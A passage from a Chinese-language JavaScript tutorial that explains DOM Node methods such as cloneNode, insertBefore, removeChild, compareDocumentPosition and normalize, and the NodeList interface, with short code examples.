用法</span></span><br><span class="line"><span class="title class_">DOMComb</span>(<span class="variable language_">document</span>.<span class="property">body</span>, <span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>DOMComb</code>函数的第一个参数是某个指定的节点，第二个参数是回调函数。这个回调函数会依次作用于指定节点，以及指定节点的所有后代节点。</p>
<h4 id="2-3-Node-prototype-cloneNode-Boolean-克隆节点"><a href="#2-3-Node-prototype-cloneNode-Boolean-克隆节点" class="headerlink" title="2.3 Node.prototype.cloneNode(Boolean) 克隆节点"></a>2.3 Node.prototype.cloneNode(Boolean) 克隆节点</h4><p><code>cloneNode</code>方法用于<strong>克隆一个节点</strong>。<strong>它接受一个布尔值作为参数，表示是否同时克隆子节点</strong>。它的返回值是一个克隆出来的新节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cloneUL = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>).<span class="title function_">cloneNode</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>该方法有一些使用<strong>注意点</strong>。</p>
<p>（1）克隆一个节点，会拷贝该节点的所有属性，但是会丧失<code>addEventListener</code>方法和<code>on-</code>属性（即<code>node.onclick = fn</code>），添加在这个节点上的事件回调函数。</p>
<p>（2）该方法返回的节点不在文档之中，即没有任何父节点，必须使用诸如<code>Node.appendChild</code>这样的方法添加到文档之中。</p>
<p>（3）克隆一个节点之后，DOM 有可能出现两个有相同<code>id</code>属性（即<code>id=&quot;xxx&quot;</code>）的网页元素，这时应该修改其中一个元素的<code>id</code>属性。如果原节点有<code>name</code>属性，可能也需要修改。</p>
<h4 id="2-4-Node-prototype-insertBefore-插入节点到指定位置"><a href="#2-4-Node-prototype-insertBefore-插入节点到指定位置" class="headerlink" title="2.4 Node.prototype.insertBefore() 插入节点到指定位置"></a>2.4 Node.prototype.insertBefore() 插入节点到指定位置</h4><p><code>insertBefore</code>方法用于<strong>将某个节点插入父节点内部的指定位置</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> insertedNode = parentNode.<span class="title function_">insertBefore</span>(newNode, referenceNode);</span><br><span class="line"><span class="comment">// newNode新节点将插入到parentNode内部的referenceNode节点前面，并返回新节点</span></span><br></pre></td></tr></table></figure>

<p><code>insertBefore</code>方法接受两个参数，第一个参数是所要插入的节点<code>newNode</code>，第二个参数是父节点<code>parentNode</code>内部的一个子节点<code>referenceNode</code>。<code>newNode</code>将插在<code>referenceNode</code>这个子节点的前面。返回值是插入的新节点<code>newNode</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(p, <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>);<span class="comment">// 把p节点插入到body内部第一个元素的前面</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，新建一个<code> &lt;p&gt; </code>节点，插在<code>document.body.firstChild</code>的前面，也就是成为<code>document.body</code>的第一个子节点。</p>
<p>如果<code>insertBefore</code>方法的第二个参数为<code>null</code>，则新节点将插在当前节点内部的最后位置，即变成最后一个子节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(p, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p</code>将成为<code>document.body</code>的最后一个子节点。这也说明<code>insertBefore</code>的第二个参数不能省略。</p>
<p><strong>注意</strong>，如果所要插入的节点是当前 DOM 现有的节点，则该节点将从原有的位置移除，插入新的位置。</p>
<p>由于不存在<code>insertAfter</code>方法，如果新节点要插在父节点的<strong>某个子节点后面</strong>，可以用<code>insertBefore</code>方法结合<code>nextSibling</code>属性模拟。</p>
<p><strong>插入到某个子节点后面</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.<span class="title function_">insertBefore</span>(s1, s2.<span class="property">nextSibling</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>parent</code>是父节点，<code>s1</code>是一个全新的节点，<code>s2</code>是可以将<code>s1</code>节点，插在<code>s2</code>节点的后面。如果<code>s2</code>是当前节点的最后一个子节点，则<code>s2.nextSibling</code>返回<code>null</code>，这时<code>s1</code>节点会插在当前节点的最后，变成当前节点的最后一个子节点，等于紧跟在<code>s2</code>的后面。</p>
<p>如果要插入的节点是<code>DocumentFragment</code>类型，那么插入的将是<code>DocumentFragment</code>的所有子节点，而不是<code>DocumentFragment</code>节点本身。返回值将是一个空的<code>DocumentFragment</code>节点。</p>
<h4 id="2-5-Node-prototype-removeChild-删除子节点，并返回"><a href="#2-5-Node-prototype-removeChild-删除子节点，并返回" class="headerlink" title="2.5 Node.prototype.removeChild() 删除子节点，并返回"></a>2.5 Node.prototype.removeChild() 删除子节点，并返回</h4><p><code>removeChild</code>方法<strong>接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divA = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">divA.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(divA); <span class="comment">// 先获取父节点再调用删除子节点方法，并指定删除的子节点为divA</span></span><br></pre></td></tr></table></figure>

<p>上面代码移除了<code>divA</code>节点。<strong>注意，这个方法是在<code>divA</code>的父节点上调用的，不是在<code>divA</code>上调用的。</strong></p>
<p>下面是如何<strong>移除当前节点的所有子节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;top&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (element.<span class="property">firstChild</span>) &#123;</span><br><span class="line">  element.<span class="title function_">removeChild</span>(element.<span class="property">firstChild</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>被移除的节点依然存在于内存之中</strong>，但不再是 DOM 的一部分。所以，一个节点移除以后，依然可以使用它，比如插入到另一个节点下面。</p>
<p>如果参数节点不是当前节点的子节点，<code>removeChild</code>方法将报错。</p>
<h4 id="2-6-Node-prototype-replaceChild-替换子节点，返回被替换的"><a href="#2-6-Node-prototype-replaceChild-替换子节点，返回被替换的" class="headerlink" title="2.6 Node.prototype.replaceChild() 替换子节点，返回被替换的"></a>2.6 Node.prototype.replaceChild() 替换子节点，返回被替换的</h4><p><code>replaceChild</code>方法<strong>用于将一个新的节点，替换当前节点的某一个子节点</strong>。<strong>返回被替换的子节点。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> replacedNode = parentNode.<span class="title function_">replaceChild</span>(newChild, oldChild);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>replaceChild</code>方法接受两个参数，第一个参数<code>newChild</code>是用来替换的新节点，第二个参数<code>oldChild</code>是将要替换走的子节点。返回值是替换走的那个节点<code>oldChild</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divA = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divA&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> newSpan = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">newSpan.<span class="property">textContent</span> = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line">divA.<span class="property">parentNode</span>.<span class="title function_">replaceChild</span>(newSpan, divA);</span><br></pre></td></tr></table></figure>

<p>上面代码是将指定节点<code>divA</code>替换为新节点<code>newSpan</code>。</p>
<h4 id="2-7-Node-prototype-contains-参数节点是否为后代节点或当前节点，返回布尔值"><a href="#2-7-Node-prototype-contains-参数节点是否为后代节点或当前节点，返回布尔值" class="headerlink" title="2.7 Node.prototype.contains() 参数节点是否为后代节点或当前节点，返回布尔值"></a>2.7 Node.prototype.contains() 参数节点是否为后代节点或当前节点，返回布尔值</h4><p><code>contains</code>方法<strong>返回一个布尔值，表示参数节点是否满足以下三个条件之一</strong>。</p>
<ul>
<li>参数节点为当前节点。</li>
<li>参数节点为当前节点的子节点。</li>
<li>参数节点为当前节点的后代节点。</li>
</ul>
<p><strong>当前节点中是否包含参数节点</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">contains</span>(node)</span><br></pre></td></tr></table></figure>

<p>上面代码检查参数节点<code>node</code>，是否包含在当前文档之中。</p>
<p><strong>注意</strong>，当前节点传入<code>contains</code>方法，返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nodeA.<span class="title function_">contains</span>(nodeA) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="2-8-Node-prototype-compareDocumentPosition-和contains方法类似，返回值可算出位置关系"><a href="#2-8-Node-prototype-compareDocumentPosition-和contains方法类似，返回值可算出位置关系" class="headerlink" title="2.8 Node.prototype.compareDocumentPosition() 和contains方法类似，返回值可算出位置关系"></a>2.8 Node.prototype.compareDocumentPosition() 和contains方法类似，返回值可算出位置关系</h4><p><code>compareDocumentPosition</code>方法的用法，<strong>与<code>contains</code>方法完全一致，返回一个六个比特位的二进制值，表示参数节点与当前节点的关系</strong>。</p>
<table>
<thead>
<tr>
<th align="left">二进制值</th>
<th align="left">十进制值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">000000</td>
<td align="left">0</td>
<td align="left">两个节点相同</td>
</tr>
<tr>
<td align="left">000001</td>
<td align="left">1</td>
<td align="left">两个节点不在同一个文档（即有一个节点不在当前文档）</td>
</tr>
<tr>
<td align="left">000010</td>
<td align="left">2</td>
<td align="left">参数节点在当前节点的前面</td>
</tr>
<tr>
<td align="left">000100</td>
<td align="left">4</td>
<td align="left">参数节点在当前节点的后面</td>
</tr>
<tr>
<td align="left">001000</td>
<td align="left">8</td>
<td align="left">参数节点包含当前节点</td>
</tr>
<tr>
<td align="left">010000</td>
<td align="left">16</td>
<td align="left">当前节点包含参数节点</td>
</tr>
<tr>
<td align="left">100000</td>
<td align="left">32</td>
<td align="left">浏览器内部使用</td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;mydiv&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;form&gt;&lt;input id=&quot;test&quot; /&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="title function_">compareDocumentPosition</span>(input) <span class="comment">// 20 当前节点包含参数节点（16）+ 参数节点在当前节点的后面（4）</span></span><br><span class="line">input.<span class="title function_">compareDocumentPosition</span>(div) <span class="comment">// 10 参数节点包含当前节点（8）+ 参数节点在当前节点的前面（2）</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，节点<code>div</code>包含节点<code>input</code>（二进制<code>010000</code>），而且节点<code>input</code>在节点<code>div</code>的后面（二进制<code>000100</code>），所以第一个<code>compareDocumentPosition</code>方法返回<code>20</code>（二进制<code>010100</code>，即<code>010000 + 000100</code>），第二个<code>compareDocumentPosition</code>方法返回<code>10</code>（二进制<code>001010</code>）。</p>
<p>由于<code>compareDocumentPosition</code>返回值的含义，定义在每一个比特位上，所以如果要检查某一种特定的含义，就需要使用比特位运算符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> head = <span class="variable language_">document</span>.<span class="property">head</span>;</span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="property">body</span>;</span><br><span class="line"><span class="keyword">if</span> (head.<span class="title function_">compareDocumentPosition</span>(body) &amp; <span class="number">4</span>) &#123; <span class="comment">// 4表示 参数节点在当前节点的后面</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;文档结构正确&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;&lt;body&gt; 不能在 &lt;head&gt; 前面&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>compareDocumentPosition</code>的返回值与<code>4</code>（又称掩码）进行与运算（<code>&amp;</code>），得到一个布尔值，表示<code>是否在</code>前面。</p>
<h4 id="2-9-Node-prototype-isEqualNode-节点是否相等-Node-prototype-isSameNode-节点是否相同"><a href="#2-9-Node-prototype-isEqualNode-节点是否相等-Node-prototype-isSameNode-节点是否相同" class="headerlink" title="2.9 Node.prototype.isEqualNode() 节点是否相等 Node.prototype.isSameNode() 节点是否相同"></a>2.9 Node.prototype.isEqualNode() 节点是否相等 Node.prototype.isSameNode() 节点是否相同</h4><p><code>isEqualNode</code>方法<strong>返回一个布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">p1.<span class="title function_">isEqualNode</span>(p2) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><code>isSameNode</code>方法<strong>返回一个布尔值，表示两个节点是否为同一个节点</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"></span><br><span class="line">p1.<span class="title function_">isSameNode</span>(p2) <span class="comment">// false</span></span><br><span class="line">p1.<span class="title function_">isSameNode</span>(p1) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h4 id="2-10-Node-prototype-normalize-将当前节点和它的后代节点”规范化“"><a href="#2-10-Node-prototype-normalize-将当前节点和它的后代节点”规范化“" class="headerlink" title="2.10 Node.prototype.normalize()  将当前节点和它的后代节点”规范化“"></a>2.10 Node.prototype.normalize()  将当前节点和它的后代节点”规范化“</h4><p><code>normalize</code>方法 <strong>将当前节点和它的后代节点”规范化“</strong> 。在一个”规范化”后的DOM树中，不存在一个空的文本节点，或者两个相邻的文本节点。</p>
<p>注1：“空的文本节点”并不包括空白字符(空格，换行等)构成的文本节点。</p>
<p>注2：两个以上相邻文本节点的产生原因包括：</p>
<ol>
<li>通过脚本调用有关的DOM接口进行了文本节点的插入和分割等。</li>
<li>HTML中超长的文本节点会被浏览器自动分割为多个相邻文本节点。</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wrapper = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line"></span><br><span class="line">wrapper.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;Part 1 &quot;</span>));</span><br><span class="line">wrapper.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;Part 2 &quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这时(规范化之前),wrapper.childNodes.length === 2</span></span><br><span class="line"><span class="comment">// wrapper.childNodes[0].textContent === &quot;Part 1 &quot;</span></span><br><span class="line"><span class="comment">// wrapper.childNodes[1].textContent === &quot;Part 2 &quot;</span></span><br><span class="line"></span><br><span class="line">wrapper.<span class="title function_">normalize</span>();</span><br><span class="line"><span class="comment">// 现在(规范化之后), wrapper.childNodes.length === 1</span></span><br><span class="line"><span class="comment">// wrapper.childNodes[0].textContent === &quot;Part 1 Part 2&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码使用<code>normalize</code>方法之前，<code>wrapper</code>节点有两个毗邻的文本子节点。使用<code>normalize</code>方法之后，两个文本子节点被合并成一个。</p>
<p>该方法是<code>Text.splitText</code>的逆方法，可以查看《Text 节点对象》一章，了解更多内容。</p>
<h4 id="2-11-Node-prototype-getRootNode-获取根节点（document）"><a href="#2-11-Node-prototype-getRootNode-获取根节点（document）" class="headerlink" title="2.11 Node.prototype.getRootNode() 获取根节点（document）"></a>2.11 Node.prototype.getRootNode() 获取根节点（document）</h4><p><code>getRootNode()</code>方法<strong>返回当前节点所在文档的根节点<code>document</code>，与<code>ownerDocument</code>属性的作用相同</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>.<span class="title function_">getRootNode</span>() === <span class="variable language_">document</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>.<span class="title function_">getRootNode</span>() === <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>.<span class="property">ownerDocument</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>该方法可用于<code>document</code>节点自身，这一点与<code>document.ownerDocument</code>不同。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getRootNode</span>() <span class="comment">// document</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">ownerDocument</span> <span class="comment">// null</span></span><br></pre></td></tr></table></figure>



<h2 id="三、NodeList-接口-与-HTMLCollection-接口-（节点的集合）"><a href="#三、NodeList-接口-与-HTMLCollection-接口-（节点的集合）" class="headerlink" title="三、NodeList 接口 与 HTMLCollection 接口 （节点的集合）"></a>三、NodeList 接口 与 HTMLCollection 接口 （节点的集合）</h2><p>节点都是单个对象，有时需要一种数据结构，能够容纳多个节点。DOM 提供两种<strong>节点集合</strong>，用于容纳多个节点：<code>NodeList</code>和<code>HTMLCollection</code>。</p>
<p>这两种集合都属于接口规范。许多 DOM 属性和方法，返回的结果是<code>NodeList</code>实例或<code>HTMLCollection</code>实例。主要区别是，**<code>NodeList</code>可以包含各种类型的节点，<code>HTMLCollection</code>只能包含 HTML 元素节点**。</p>
<h3 id="1、NodeList-接口-（各类节点的集合）"><a href="#1、NodeList-接口-（各类节点的集合）" class="headerlink" title="1、NodeList 接口 （各类节点的集合）"></a>1、NodeList 接口 （各类节点的集合）</h3><h4 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h4><p><code>NodeList</code>实例是一个<strong>类似数组的对象，它的成员是节点对象</strong>。通过以下方法可以得到<code>NodeList</code>实例。</p>
<ul>
<li><strong><code>Node.childNodes</code> 属性</strong></li>
<li><strong><code>document.querySelectorAll()</code>等节点搜索方法</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span> <span class="keyword">instanceof</span> <span class="title class_">NodeList</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&lt;ul&gt;</span></span><br><span class="line"><span class="comment">    &lt;li&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">    &lt;li&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">    &lt;li&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="comment">&lt;/ul&gt;*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $li = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($li) <span class="comment">// NodeList(3) [li, li, li]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($li <span class="keyword">instanceof</span> <span class="title class_">NodeList</span>) <span class="comment">// true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>NodeList</code>实例很像数组，<strong>可以使用<code>length</code>属性和<code>forEach</code>方法</strong>。但是，它不是数组，不能使用<code>pop</code>或<code>push</code>之类数组特有的方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="title function_">isArray</span>(children) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">children.<span class="property">length</span> <span class="comment">// 34</span></span><br><span class="line">children.<span class="title function_">forEach</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码中，NodeList 实例<code>children</code>不是数组，但是具有<code>length</code>属性和<code>forEach</code>方法。</p>
<p>如果<code>NodeList</code>实例要使用数组方法，<strong>可以将其转为真正的数组</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>;</span><br><span class="line"><span class="keyword">var</span> nodeArr = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(children);</span><br></pre></td></tr></table></figure>

<p>除了使用<code>forEach</code>方法遍历 NodeList 实例，<strong>还可以使用<code>for</code>循环</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> item = children[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，NodeList 实例<strong>可能是动态集合，也可能是静态集合</strong>。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。<strong>目前，只有<code>Node.childNodes</code>返回的是一个动态集合，其他的 NodeList 都是静态集合。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>;</span><br><span class="line">children.<span class="property">length</span> <span class="comment">// 18</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>));</span><br><span class="line">children.<span class="property">length</span> <span class="comment">// 19</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，文档增加一个子节点，NodeList 实例<code>children</code>的<code>length</code>属性就增加了1。</p>
<h4 id="1-2-NodeList-prototype-length"><a href="#1-2-NodeList-prototype-length" class="headerlink" title="1.2 NodeList.prototype.length"></a>1.2 NodeList.prototype.length</h4><p><code>length</code>属性返回 NodeList 实例包含的节点数量。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;xxx&#x27;</span>).<span class="property">length</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>document.querySelectorAll</code>返回一个 NodeList 集合。对于那些不存在的 HTML 标签，<code>length</code>属性返回<code>0</code>。</p>
<h4 id="1-3-NodeList-prototype-forEach"><a href="#1-3-NodeList-prototype-forEach" class="headerlink" title="1.3 NodeList.prototype.forEach()"></a>1.3 NodeList.prototype.forEach()</h4><p><code>forEach</code>方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的<code>forEach</code>方法完全一致。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>;</span><br><span class="line">children.<span class="title function_">forEach</span>(<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">item, i, list</span>) &#123; <span class="comment">// 参数：当前成员、当前索引、NodeList实例</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;, <span class="variable language_">this</span>); <span class="comment">// forEach参数二： 绑定回调函数内部的this，可省略</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，回调函数<code>f</code>的三个参数依次是<strong>当前成员、位置和当前 NodeList 实例</strong>。<code>forEach</code>方法的第二个参数，用于绑定回调函数内部的<code>this</code>，该参数可省略。</p>
<h4 id="1-4-NodeList-prototype-item-接受一个索引参数，返回该索引上的成员（节点）"><a href="#1-4-NodeList-prototype-item-接受一个索引参数，返回该索引上的成员（节点）" class="headerlink" title="1.4 NodeList.prototype.item() 接受一个索引参数，返回该索引上的成员（节点）"></a>1.4 NodeList.prototype.item() 接受一个索引参数，返回该索引上的成员（节点）</h4><p><code>item</code>方法<strong>接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">childNodes</span>.<span class="title function_">item</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>item(0)</code>返回第一个成员。</p>
<p>如果参数值大于实际长度，或者索引不合法（比如负数），<code>item</code>方法返回<code>null</code>。如果省略参数，<code>item</code>方法会报错。</p>
